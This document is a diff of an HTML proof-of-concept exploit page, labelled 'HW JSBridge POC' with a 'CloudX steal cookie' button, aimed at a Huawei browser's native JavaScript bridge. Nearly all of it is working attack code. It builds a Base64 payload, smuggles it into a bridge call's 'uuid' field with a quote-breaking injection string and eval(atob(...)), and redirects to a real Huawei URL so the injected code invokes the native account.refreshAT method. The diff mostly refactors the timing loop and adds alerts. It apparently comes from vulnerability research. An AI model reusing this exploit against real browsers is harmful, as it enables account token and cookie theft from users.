@@ -1,12 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
-<!-- 规范HTML结构：head在前，body在后，h1移入body -->
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HW JSBridge POC</title>
     <style>
-        /* 简单优化按钮样式，适配不同屏幕 */
         #triggerBtn {
             width: 80%;
             height: 200px;
@@ -16,13 +14,13 @@
             color: #fff;
             border: none;
             border-radius: 10px;
+            margin: 20px auto;
+            display: block;
         }
-
         #triggerBtn:disabled {
             background: #ccc;
             cursor: not-allowed;
         }
-
         h1 {
             color: #d93025;
             text-align: center;
@@ -30,129 +28,155 @@
     </style>
 </head>
 <body>
-<h1>AAAAAAAAAAAAAAAAAAAAA</h1>
-<!-- 给按钮加ID，方便JS获取，移除行内onclick（解耦） -->
-<button id="triggerBtn">CloudX steal cookie</button>
+    <h1>AAAAAAAAAAAAAAAAAAAAA</h1>
+    <button id="triggerBtn">CloudX steal cookie</button>
 
-<script type="text/javascript">
-    // 1. 开启严格模式 + 封装为IIFE，避免全局变量污染
-    (() => {
-        "use strict";
-        // 存储定时器ID，用于页面跳转后清理，防止浏览器卡顿
-        const timerIds = [];
-        // 定义要注入的执行代码，改用模板字符串，简洁易维护（替换原繁琐的字符串拼接）
-        const injectCode = `
+    <script type="text/javascript">
+        (() => {
+            "use strict";
+            // 存储定时器ID（仅用于重试检测，数量大幅减少）
+            let timerId = null;
+            // 执行成功标记：避免重复调用JSBridge
+            let isExecuted = false;
+            // 注入代码（保留原逻辑，增强弹框和异常处理）
+            const injectCode = `
                 setTimeout(() => {
+                    alert('[注入逻辑触发] 开始执行原生方法调用逻辑...');
                     window.hwbr = window.hwbr || {};
                     window.hwbr.callbackFromNative = function (a, b, c, d, e) {
                         if (a === 'callbackId') {
-                            // 原生回调弹框：展示返回参数，增加标识文案
-                            alert('[原生回调成功]\\n参数b：' + (b || '无') + '\\n参数c：' + (c || '无') + '\\n参数d：' + (d ? d.toString() : '无'));
+                            // 原生回调弹框：空值友好展示
+                            alert('[✅ 原生回调成功]\\n参数b：' + (b ?? '无') + '\\n参数c：' + (c ?? '无') + '\\n参数d：' + (d ? d.toString() : '无'));
                         }
                     };
-                    // 调用原生方法前增加弹框提示
-                    alert('准备调用原生account.refreshAT方法...');
+                    // 检测_hwbrNative再调用，避免报错
                     if (window._hwbrNative && typeof window._hwbrNative.invoke === 'function') {
+                        alert('[准备调用] 原生account.refreshAT方法');
                         window._hwbrNative.invoke('account', 'refreshAT', 'callbackId', '["123", "123"]', 10);
                     } else {
-                        alert('[错误] 未检测到_hwbrNative.invoke方法');
+                        alert('[❌ 错误] 未检测到_hwbrNative.invoke方法，无法调用原生接口');
+                        console.error('_hwbrNative is not defined or invoke is not a function');
                     }
                 }, 500);
             `;
-        // 目标跳转URL（抽离为常量，方便修改）
-        const targetUrl = 'https://feeds-drcn.cloud.huawei.com.cn/landingpage/latest?docid=1051253f3e903d7ffbd11fc014b09f7240dc0f6&to_app=hwbrowser&dy_scenario=relate&tn=fdb43cc7d95113d61182a46e5027c537c4e9b1c2dbcc7503bab085653b6c181a&channel=HW_FACA_ZH&ctype=news&cpid=666&r=CN#/';
+            // 目标跳转URL
+            const targetUrl = 'https://feeds-drcn.cloud.huawei.com.cn/landingpage/latest?docid=1051253f3e903d7ffbd11fc014b09f7240dc0f6&to_app=hwbrowser&dy_scenario=relate&tn=fdb43cc7d95113d61182a46e5027c537c4e9b1c2dbcc7503bab085653b6c181a&channel=HW_FACA_ZH&ctype=news&cpid=666&r=CN#/';
 
-        // 2. 封装Base64编解码兼容函数（解决原生btoa对特殊字符的编码问题）
-        function base64Encode(str) {
-            return btoa(unescape(encodeURIComponent(str)));
-        }
+            // Base64兼容编解码（处理特殊字符）
+            function base64Encode(str) {
+                return btoa(unescape(encodeURIComponent(str)));
+            }
 
-        function base64Decode(str) {
-            return decodeURIComponent(escape(atob(str)));
-        }
+            // 清理定时器：单个定时器，简洁高效
+            function clearTimer() {
+                if (timerId) {
+                    clearTimeout(timerId);
+                    timerId = null;
+                    console.log('已清理未执行的检测定时器');
+                }
+            }
 
-        // 3. 核心POC触发函数，增加全环节try/catch异常处理
-        function triggerPoc(url, code) {
-            // 禁用按钮，防止重复点击触发多次执行
-            const btn = document.getElementById('triggerBtn');
-            btn.disabled = true;
-            btn.innerText = '执行中...请勿重复点击';
+            // 核心：JSBridge检测+调用（改为重试模式，替代4000次循环）
+            function checkAndCallJSBridge(injectBase64, currUrl) {
+                // 已执行/已清理，直接返回
+                if (isExecuted || !timerId) return;
+                
+                try {
+                    // 健壮检测_HwJSBridge
+                    if (window._HwJSBridge && typeof window._HwJSBridge.invokeAsync === "function") {
+                        isExecuted = true; // 标记执行成功
+                        clearTimer(); // 立即清理定时器，避免重复执行
+                        
+                        // 构造注入载荷（修复原content未定义问题）
+                        const injectPayload = '\'},\'*\');}}};' + `eval(atob("${injectBase64}"));//`;
+                        const data = {
+                            'content': JSON.stringify({}),
+                            'url': 'https://www.baidu.com',
+                            'webid': 'deadbeef',
+                            'top': false,
+                            'uuid': injectPayload
+                        };
 
-            try {
-                const currUrl = window.location.href;
-                // 构造注入载荷，增加空值判断，避免语法错误
-                const payload = `
-                        if (!location.href.startsWith("${currUrl || ''}") && !window.__cloudx_called) {
+                        // 关键弹框：确认检测到JSBridge，即将发送载荷
+                        alert('[✅ JSBridge检测成功] 已找到_HwJSBridge.invokeAsync，准备发送注入载荷！');
+                        // 调用原生JSBridge方法
+                        window._HwJSBridge.invokeAsync('pps.consent.query', JSON.stringify(data), '123');
+                        alert('[✅ 载荷发送成功] 已通过pps.consent.query将注入代码发送至原生！');
+                        
+                        // 跳转到目标页（触发注入逻辑的url判断条件）
+                        alert('[准备跳转] 即将跳转到目标页，触发注入代码执行...');
+                        window.location.href = targetUrl;
+                    } else {
+                        // 未检测到，提示并继续重试
+                        console.log('未检测到_HwJSBridge，继续重试...');
+                        // 重试：100ms后再次检测，最多重试20次（可自行调整）
+                        const retryCount = +timerId.toString().split('_')[1] || 1;
+                        if (retryCount >= 20) {
+                            clearTimer();
+                            alert('[❌ 检测失败] 重试20次后仍未找到_HwJSBridge，可能非华为浏览器环境');
+                            // 恢复按钮状态
+                            document.getElementById('triggerBtn').disabled = false;
+                            document.getElementById('triggerBtn').innerText = 'CloudX steal cookie';
+                            return;
+                        }
+                        // 重新创建定时器，携带重试次数
+                        timerId = setTimeout(() => checkAndCallJSBridge(injectBase64, currUrl), 100);
+                        Object.defineProperty(timerId, 'retryCount', { value: retryCount + 1 });
+                    }
+                } catch (err) {
+                    clearTimer();
+                    alert(`[❌ 检测执行错误] ${err.message}`);
+                    console.error('JSBridge检测错误：', err);
+                    // 恢复按钮
+                    document.getElementById('triggerBtn').disabled = false;
+                    document.getElementById('triggerBtn').innerText = 'CloudX steal cookie';
+                }
+            }
+
+            // 核心POC触发函数
+            function triggerPoc(url, code) {
+                const btn = document.getElementById('triggerBtn');
+                btn.disabled = true;
+                btn.innerText = '执行中...请勿重复点击';
+                // 重置状态：避免多次点击的状态污染
+                isExecuted = false;
+                clearTimer();
+
+                try {
+                    const currUrl = window.location.href;
+                    // 构造注入载荷，转义url避免语法错误
+                    const safeCurrUrl = encodeURIComponent(currUrl);
+                    const payload = `
+                        if (!location.href.startsWith("${safeCurrUrl}") && !window.__cloudx_called) {
                             window.__cloudx_called = true;
                             ${code || ''}
                         }
                     `;
-                // 编码载荷，使用封装的兼容函数
-                const base64 = base64Encode(payload);
-                alert('[执行开始] 已构造注入载荷，开始检测JSBridge...');
+                    // Base64编码载荷
+                    const injectBase64 = base64Encode(payload);
+                    
+                    alert('[📌 执行开始] 已构造注入载荷，启动JSBridge重试检测（共20次，每次100ms）');
+                    // 首次启动检测：立即执行一次，后续自动重试
+                    timerId = setTimeout(() => checkAndCallJSBridge(injectBase64, currUrl), 0);
+                    Object.defineProperty(timerId, 'retryCount', { value: 1 });
 
-                // 4. 循环创建定时器，存储ID用于后续清理
-                for (let i = 0; i < 4000; i++) {
-                    const timerId = setTimeout(function () {
-                        try {
-                            // 健壮检测JSBridge：存在且invokeAsync是函数
-                            if (window._HwJSBridge && typeof window._HwJSBridge.invokeAsync === "function") {
-                                // 修复原致命错误：content变量未定义，直接传空对象
-                                const injectPayload = '\'},\'*\');}}};' + `eval(atob("${base64}"));//`;
-                                const data = {
-                                    'content': JSON.stringify({}),
-                                    'url': 'https://www.baidu.com',
-                                    'webid': 'deadbeef',
-                                    'top': false,
-                                    'uuid': injectPayload
-                                };
-                                // 调用JSBridge前弹框提示
-                                alert('[JSBridge检测成功] 准备发送注入载荷...');
-                                // 异步调用原生方法，增加异常捕获
-                                window._HwJSBridge.invokeAsync('pps.consent.query', JSON.stringify(data), '123');
-                                alert('[注入成功] 载荷已通过pps.consent.query发送至原生！');
-                            }
-                        } catch (err) {
-                            // 捕获单次定时器内的错误，不影响其他定时器
-                            alert(`[定时器执行错误] 第${i}次执行失败：${err.message}`);
-                            console.error('定时器错误：', err);
-                        }
-                    }, i);
-                    // 存储定时器ID
-                    timerIds.push(timerId);
+                } catch (globalErr) {
+                    alert(`[❌ 全局错误] 核心逻辑执行失败：${globalErr.message}`);
+                    console.error('全局错误：', globalErr);
+                    // 异常恢复按钮
+                    btn.disabled = false;
+                    btn.innerText = 'CloudX steal cookie';
                 }
-
-                // 5. 页面跳转前弹框提示，清理定时器后跳转
-                alert(`[准备跳转] 即将跳转到目标URL：${url.slice(0, 50)}...`);
-                // 跳转前清理未执行的定时器（优化性能，避免无效执行）
-                clearTimers();
-                window.location.href = url;
-
-            } catch (globalErr) {
-                // 捕获全局致命错误，弹框提示并恢复按钮状态
-                alert(`[全局执行失败] 核心逻辑出错：${globalErr.message}`);
-                console.error('全局错误：', globalErr);
-                btn.disabled = false;
-                btn.innerText = 'CloudX steal cookie';
             }
-        }
 
-        // 6. 封装定时器清理函数，避免浏览器卡顿
-        function clearTimers() {
-            timerIds.forEach(id => clearTimeout(id));
-            timerIds.length = 0;
-            alert('已清理未执行的定时器，优化浏览器性能');
-        }
+            // 页面卸载前兜底清理定时器（防止内存泄漏）
+            window.addEventListener('beforeunload', clearTimer);
+            // 绑定按钮点击事件（解耦）
+            document.getElementById('triggerBtn').addEventListener('click', function () {
+                triggerPoc(targetUrl, injectCode);
+            });
 
-        // 7. 页面卸载前清理定时器（兜底，防止页面跳转后定时器仍执行）
-        window.addEventListener('beforeunload', clearTimers);
-
-        // 8. 绑定按钮点击事件（解耦HTML和JS，符合开发规范）
-        document.getElementById('triggerBtn').addEventListener('click', function () {
-            triggerPoc(targetUrl, injectCode);
-        });
-
-    })();
-</script>
+        })();
+    </script>
 </body>
 </html>
